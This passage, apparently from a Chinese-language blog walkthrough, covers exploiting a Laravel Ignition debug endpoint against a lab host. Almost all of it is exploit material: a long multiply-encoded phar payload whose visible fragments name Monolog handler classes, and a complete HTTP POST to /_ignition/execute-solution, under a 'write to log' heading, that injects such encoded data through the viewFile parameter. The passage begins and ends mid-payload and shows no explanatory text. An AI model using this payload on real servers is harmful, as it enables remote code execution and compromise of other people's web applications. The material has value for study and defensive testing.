x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;30&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;4E&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;66&#x3D;00&#x3D;64&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;39&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;4E&#x3D;00&#x3D;70&#x3D;00&#x3D;65&#x3D;00&#x3D;6D&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4C&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;31&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;77&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;4D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;77&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;33&#x3D;00&#x3D;4A&#x3D;00&#x3D;7A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;68&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;58&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;66&#x3D;00&#x3D;5A&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;59&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;35&#x3D;00&#x3D;64&#x3D;00&#x3D;71&#x3D;00&#x3D;45&#x3D;00&#x3D;47&#x3D;00&#x3D;48&#x3D;00&#x3D;58&#x3D;00&#x3D;52&#x3D;00&#x3D;53&#x3D;00&#x3D;6B&#x3D;00&#x3D;44&#x3D;00&#x3D;33&#x3D;00&#x3D;50&#x3D;00&#x3D;52&#x3D;00&#x3D;6D&#x3D;00&#x3D;33&#x3D;00&#x3D;58&#x3D;00&#x3D;36&#x3D;00&#x3D;2F&#x3D;00&#x3D;68&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;31&#x3D;00&#x3D;4D&#x3D;00&#x3D;58&#x3D;00&#x3D;51&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00&#39;</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><h3 id="写入log"><a href="#写入log" class="headerlink" title="写入log"></a>写入log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 6537</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;7A&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;46&#x3D;00&#x3D;4E&#x3D;00&#x3D;35&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;56&#x3D;00&#x3D;6B&#x3D;00&#x3D;63&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;61&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;53&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;55&#x3D;00&#x3D;32&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;33&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;76&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;73&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;4F&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D